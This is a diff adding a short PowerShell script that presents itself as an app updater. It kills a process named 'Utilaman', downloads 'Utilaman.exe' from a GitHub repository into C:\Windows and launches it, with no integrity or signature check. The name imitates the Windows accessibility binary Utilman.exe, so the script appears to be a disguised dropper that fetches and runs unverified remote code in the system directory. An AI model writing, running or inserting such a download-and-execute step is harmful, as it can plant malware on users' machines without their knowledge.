@@ -1,0 +1,15 @@
+$AppPath = 'C:\Windows\Utilaman.exe'
+
+$Url = 'https://github.com/drnnahidfree02-sys/MyAppUpdater/raw/refs/heads/main/Utilaman.exe'
+
+Get-Process -Name 'Utilaman' `
+    -ErrorAction SilentlyContinue |
+    Stop-Process -Force
+
+Start-Sleep -Seconds 2
+
+Invoke-WebRequest `
+    -Uri $Url `
+    -OutFile $AppPath
+
+Start-Process -FilePath $AppPath
